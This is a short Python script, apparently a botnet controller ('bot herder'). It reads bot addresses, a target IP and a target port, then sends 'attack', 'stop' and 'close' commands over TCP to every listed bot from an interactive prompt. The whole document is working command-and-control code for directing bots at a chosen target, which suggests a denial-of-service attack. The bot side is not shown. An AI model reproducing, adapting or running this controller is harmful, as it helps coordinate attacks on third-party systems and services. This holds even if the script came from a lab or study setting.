#!/usr/bin/env python3

import argparse
import socket
import json

def craft_command(action, targetAddr, targetPort):
    command = {
        'action': action,
        'targetAddr': targetAddr,
        'targetPort': targetPort
    }
    return json.dumps(command)

def send_command(bots, data):
    for bot in bots:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(bot)
                s.send(bytes(data, 'UTF-8'))
                response = s.recv(1024)
            print('Received:' + repr(str(response, 'UTF-8')))
        except:
            print(f'Connection refused by bot {bot}!')

def main():
    bots = []
    parser = argparse.ArgumentParser(allow_abbrev=False)
    parser.add_argument('-a', '--addresses', help='add IP address and port of bots separated by comma --> host1:port1,host2:port2', 
                        required=True, action='store', type=str, metavar='\b')
    parser.add_argument('-ta', '--targetaddr', help='add IP address of the target', required=True, action='store', type=str, metavar='\b')
    parser.add_argument('-tp', '--targetport', help='add port of the target', required=True, action='store', type=int, metavar='\b')
    args = parser.parse_args()
    addresses = args.addresses.strip().split(',')
    for address in addresses:
        bot = (address.split(':')[0], int(address.split(':')[1]))
        bots.append(bot)
    
    action = ''
    while action != 'exit':
        action = input('Enter command: attack|stop|close|exit\n')
        if action == 'exit':
            print('Exit from bot herder')
        elif action == 'attack' or action == 'stop' or action == 'close':
            send_command(bots, craft_command(action, args.targetaddr, args.targetport))
        else:
            print('Wrong command, retry')

if __name__ == '__main__':
    main()
